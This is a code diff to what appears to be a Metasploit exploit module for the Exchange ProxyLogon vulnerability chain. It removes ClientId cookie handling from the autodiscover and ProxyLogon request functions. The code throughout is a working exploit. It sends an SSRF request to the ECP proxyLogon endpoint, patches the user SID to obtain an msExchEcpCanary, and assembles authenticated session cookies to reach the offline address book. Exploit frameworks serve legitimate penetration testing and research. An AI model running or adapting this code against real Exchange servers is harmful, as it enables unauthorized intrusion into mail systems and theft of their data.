@@ -255,10 +255,7 @@ class MetasploitModule < Msf::Exploit::Remote
     end
     fail_with(Failure::NotFound, 'No \'Server ID\' was found') if server.nil? || server.empty?
 
-    client_id = response.get_cookies.scan(/ClientId=(\w+);*/).flatten[0]
-    fail_with(Failure::NotFound, 'No \'Client ID\' was found') if client_id.nil? || client_id.empty?
-
-    [server, legacy_dn, client_id]
+    [server, legacy_dn]
   end
 
   def request_fqdn
@@ -355,7 +352,7 @@ class MetasploitModule < Msf::Exploit::Remote
     []
   end
 
-  def request_proxylogon(server_name, sid, session)
+  def request_proxylogon(server_name, sid)
     data = "<r at=\"Negotiate\" ln=\"#{datastore['EMAIL'].split('@')[0]}\"><s>#{sid}</s></r>"
     session_id = ''
     canary = ''
@@ -363,7 +360,6 @@ class MetasploitModule < Msf::Exploit::Remote
     response = send_http(
       'POST',
       "[:[@#{server_name}:444/ecp/proxyLogon.ecp?a=~#{random_ssrf_id}",
-      cookie: session,
       data: data,
       ctype: 'text/xml; charset=utf-8',
       headers: {
@@ -387,7 +383,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
     # get informations by autodiscover request.
     print_status(message('Sending autodiscover request'))
-    server_id, legacy_dn, client_id = request_autodiscover(server_name)
+    server_id, legacy_dn = request_autodiscover(server_name)
 
     print_status("Server: #{server_id}")
     print_status("LegacyDN: #{legacy_dn}")
@@ -397,10 +393,8 @@ class MetasploitModule < Msf::Exploit::Remote
     sid = request_mapi(server_name, legacy_dn, server_id)
     print_status("SID: #{sid} (#{datastore['EMAIL']})")
 
-    session = "ClientId=#{client_id};"
-
     # search oab
-    sid, session, canary, oab_id = search_oab(server_name, sid, session)
+    sid, session, canary, oab_id = search_oab(server_name, sid)
 
     [server_name, sid, session, canary, oab_id]
   end
@@ -439,22 +433,22 @@ class MetasploitModule < Msf::Exploit::Remote
     [input_name, remote_file]
   end
 
-  def search_oab(server_name, sid, session)
+  def search_oab(server_name, sid)
     # request cookies (session and canary)
     print_status(message('Sending ProxyLogon request'))
 
     print_status('Try to get a good msExchCanary (by patching user SID method)')
-    session_id, canary = request_proxylogon(server_name, patch_sid(sid), session)
+    session_id, canary = request_proxylogon(server_name, patch_sid(sid))
     if canary
-      auth_session = "#{session} ASP.NET_SessionId=#{session_id}; msExchEcpCanary=#{canary};"
+      auth_session = "ASP.NET_SessionId=#{session_id}; msExchEcpCanary=#{canary};"
       oab_id = request_oab(server_name, sid, auth_session, canary)
     end
 
     if oab_id.nil? || oab_id.empty?
       print_status('Try to get a good msExchCanary (without correcting the user SID)')
-      session_id, canary = request_proxylogon(server_name, sid, session)
+      session_id, canary = request_proxylogon(server_name, sid)
       if canary
-        auth_session = "#{session} ASP.NET_SessionId=#{session_id}; msExchEcpCanary=#{canary};"
+        auth_session = "ASP.NET_SessionId=#{session_id}; msExchEcpCanary=#{canary};"
         oab_id = request_oab(server_name, sid, auth_session, canary)
       end
     end
